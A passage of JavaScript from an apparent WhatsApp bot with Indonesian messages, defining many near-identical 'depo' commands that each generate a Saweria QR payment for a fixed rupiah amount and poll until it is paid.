- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo7000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('7000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo8000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('8000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo9000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('9000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo10000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('10000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo11000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('11000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo12000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('12000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo13000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('13000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo14000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('14000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo15000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('15000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo16000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('16000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo17000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('17000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo18000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('18000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo19000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('19000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo20000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('20000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo21000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('21000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo22000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('22000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo23000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('23000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo24000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('24000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo25000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('25000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo26000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('26000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo27000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('27000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo28000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('28000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo29000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('29000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo30000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('30000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
